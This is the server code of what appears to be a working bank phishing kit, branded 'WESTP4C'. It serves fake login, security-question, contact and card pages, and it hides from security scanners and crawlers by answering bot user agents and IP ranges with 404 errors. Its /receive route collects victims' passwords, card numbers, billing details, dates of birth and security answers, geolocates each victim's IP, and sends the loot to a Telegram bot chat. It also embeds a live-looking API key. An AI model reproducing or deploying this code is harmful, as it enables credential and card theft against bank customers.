const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const path = require('path');
const { botToken, chatId } = require('./config/settings.js');
const antibot = require('./middleware/antibot');
const { getClientIp } = require("request-ip");
const https = require('https');
const querystring = require('querystring');
const axios = require('axios');
const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const fs = require('fs').promises; 
const MobileDetect = require('mobile-detect');
const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');
const { botUAList } = require('./config/botUA.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
const { botRefList } = require('./config/botRef.js');
const { use } = require('express/lib/router');
const { sendMessageFor } = require('simple-telegram-message');

const port = 3000;




app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Middleware function for mobile detection
app.use((req, res, next) => {
  const md = new MobileDetect(req.headers['user-agent']);
  req.isMobile = md.mobile();
  next();
});

// Middleware function for bot detection
function isBotUA(userAgent) {
  if (!userAgent) {
    userAgent = '';
  }

  if (isbot(userAgent)) {
    return true;
  }

  for (let i = 0; i < botUAList.length; i++) {
    if (userAgent.toLowerCase().includes(botUAList[i])) {
      return true;
    }
  }

  return false;
}

function isBotIP(ipAddress) {
  if (!ipAddress) {
    ipAddress = '';
  }

  if (ipAddress.substr(0, 7) == '::ffff:') {
    ipAddress = ipAddress.substr(7);
  }

  for (let i = 0; i < botIPList.length; i++) {
    if (ipAddress.includes(botIPList[i])) {
      return true;
    }
  }

  function IPtoNum(ip) {
    return Number(
      ip.split('.').map((d) => ('000' + d).substr(-3)).join('')
    );
  }

  const inRange = botIPRangeList.some(
    ([min, max]) =>
      IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)
  );

  if (inRange) {
    return true;
  }

  for (let i = 0; i < botIPCIDRRangeList.length; i++) {
    if (ipRangeCheck(ipAddress, botIPCIDRRangeList[i])) {
      return true;
    }
  }

  for (let i = 0; i < botIPWildcardRangeList.length; i++) {
    if (ipAddress.match(botIPWildcardRangeList[i]) !== null) {
      return true;
    }
  }

  return false;
}

function isBotRef(referer) {
  if (!referer) {
    referer = '';
  }

  for (let i = 0; i < botRefList.length; i++) {
    if (referer.toLowerCase().includes(botRefList[i])) {
      return true;
    }
  }
  return false;
}

app.use((req, res, next) => {
  const clientUA = req.headers['user-agent'] || req.get('user-agent');
  const clientIP = getClientIp(req);
  const clientRef = req.headers.referer || req.headers.origin;

  try {
    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
      console.log(`Blocked request: User-Agent: ${clientUA}, IP: ${clientIP}, Referrer: ${clientRef}`);
      return res.status(404).send('Not Found');
    } else {
      next();
    }
  } catch (error) {
    console.error('Error in bot detection middleware:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Route handler for '/login/2'
app.get('/login/2', async (req, res) => {
  try {
    let htmlContent;
    if (req.isMobile) {
      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'contactm.html'), 'utf-8');
    } else {
      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'contactdesk.html'), 'utf-8');
    }
    res.send(htmlContent);
  } catch (error) {
    console.error('Error reading file:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Route handler for '/login/3'
app.get('/login/3', async (req, res) => {
  try {
    let htmlContent;
    if (req.isMobile) {
      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'secquem.html'), 'utf-8');
    } else {
      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'secquedesk.html'), 'utf-8');
    }
    res.send(htmlContent);
  } catch (error) {
    console.error('Error reading file:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Route handler for '/login/4'
app.get('/login/4', async (req, res) => {
  try {
    let htmlContent;
    if (req.isMobile) {
      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'cardm.html'), 'utf-8');
    } else {
      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'carddesk.html'), 'utf-8');
    }
    res.send(htmlContent);
  } catch (error) {
    console.error('Error reading file:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Route handler for form submission
app.post('/receive', async (req, res) => {
  let message = '';
  let myObject = req.body;

  const ipAddress = getClientIp(req);
  const ipAddressInformation = await sendAPIRequest(ipAddress);
  const userAgent = req.headers["user-agent"];
  const systemLang = req.headers["accept-language"];

  const myObjects = Object.keys(myObject);
  console.log(myObjects);

  if (myObjects.includes('Password')) {
    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
               `👤 LOGIN \n\n`;

    for (const key of myObjects) {
      if (key !== 'visitor') {
        console.log(`${key}: ${myObject[key]}`);
        message += `${key}: ${myObject[key]}\n`;
      }
    }

    message += `🌍 GEO-IP INFO\n` +
      `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
      `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
      `CITY             : ${ipAddressInformation.location.city}\n` +
      `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
      `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
      `COUNTRY          : ${ipAddressInformation.country.name}\n` +
      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
      `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
      `💻 SYSTEM INFO\n` +
      `USER AGENT       : ${userAgent}\n` +
      `SYSTEM LANGUAGE  : ${systemLang}\n` +
      `💬 Telegram: https://t.me/UpdateTeams\n`;
  }

  if (myObjects.includes('ExpirationDate') || myObjects.includes('CardNumber') || myObjects.includes('Billing Address')) {
    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
               `👤 CARD INFO\n\n`;

    for (const key of myObjects) {
      console.log(`${key}: ${myObject[key]}`);
      message += `${key}: ${myObject[key]}\n`;
    }

    message += `🌍 GEO-IP INFO\n` +
      `IP ADDRESS       : ${ipAddress}\n` +
      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
      `💬 Telegram: https://t.me/UpdateTeams\n`;

    res.send('dn');
  }

  if (myObjects.includes('message')) {
    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
               `👤 SECURITY Q&A\n\n`;

    for (const key of myObjects) {
      console.log(`${key}: ${myObject[key]}`);
      message += `${key}: ${myObject[key]}\n`;
    }

    message += `🌍 GEO-IP INFO\n` +
      `IP ADDRESS       : ${ipAddress}\n` +
      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
      `💬 Telegram: https://t.me/UpdateTeams\n`;

    res.send('dn');
  }

  if (myObjects.includes('DOB') || myObjects.includes('PhoneNumber') || myObjects.includes('State')) {
    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
               `👤 CONTACT INFO\n\n`;

    for (const key of myObjects) {
      console.log(`${key}: ${myObject[key]}`);
      message += `${key}: ${myObject[key]}\n`;
    }

    message += `🌍 GEO-IP INFO\n` +
      `IP ADDRESS       : ${ipAddress}\n` +
      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
      `💬 Telegram: https://t.me/UpdateTeams\n`;

    res.send('dn');
  }

  const sendMessage = sendMessageFor(botToken, chatId); 
  sendMessage(message);

  console.log(message);
});

// Function to send API request
async function sendAPIRequest(ipAddress) {
  const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
}

// Route handler for login pages
app.get('/', async (req, res) => {
  try {
    let htmlContent;
    const page = req.params.page;
    const fileName = req.isMobile ? `loginm.html` : `logindesk.html`;
    htmlContent = await fs.readFile(path.join(__dirname, 'public', fileName), 'utf-8');
    res.send(htmlContent);
  } catch (error) {
    console.error('Error reading file:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Middleware function for bot detection
function antiBotMiddleware(req, res, next) {
  const clientUA = req.headers['user-agent'] || req.get('user-agent');
  const clientIP = getClientIp(req);
  const clientRef = req.headers.referer || req.headers.origin;

  if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
    return res.status(404).send('Not Found');
  } else {
    next();
  }
}

app.use(antiBotMiddleware);